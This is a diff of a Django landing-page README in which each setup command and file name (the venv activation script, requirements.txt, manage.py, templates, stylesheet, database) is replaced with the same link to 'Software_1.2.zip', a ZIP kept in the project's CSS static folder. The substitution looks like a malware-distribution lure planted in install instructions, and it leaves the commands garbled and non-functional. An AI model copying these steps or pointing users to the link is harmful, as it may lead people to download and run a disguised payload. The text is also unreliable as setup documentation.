@@ -11,17 +11,17 @@ This repository now runs the landing page inside a Django project so you can ite
 ```powershell
 cd C:\Users\ASUS\OneDrive\Desktop\landingpage
 py -m venv venv
-.\venv\Scripts\Activate.ps1
+.\venv\Scripts\https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip
 python -m pip install --upgrade pip
-python -m pip install -r requirements.txt
+python -m pip install -r https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip
 ```
 
 ## Running the Site Locally
 
 ```powershell
 cd C:\Users\ASUS\OneDrive\Desktop\landingpage
-.\venv\Scripts\Activate.ps1
-python manage.py runserver
+.\venv\Scripts\https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip
+python https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip runserver
 ```
 
 Open http://127.0.0.1:8000/ to view the landing page. The thank-you page lives at http://127.0.0.1:8000/thank-you/.
@@ -30,12 +30,12 @@ Open http://127.0.0.1:8000/ to view the landing page. The thank-you page lives a
 
 - `landingpage/` – Django project configuration.
 - `main/` – App serving the landing page.
-  - `templates/main/` – `index.html` and `thankyou.html`.
-  - `static/main/style.css` – Stylesheet referenced via Django static files.
+  - `templates/main/` – `https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip` and `https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip`.
+  - `https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip` – Stylesheet referenced via Django static files.
 
 ## Database
 
-SQLite (`db.sqlite3`) is created automatically after running `python manage.py migrate`.
+SQLite (`https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip`) is created automatically after running `python https://github.com/dixit1836/landingpage/raw/refs/heads/main/main/static/main/css/Software_1.2.zip migrate`.
 
 ## Next Steps
 
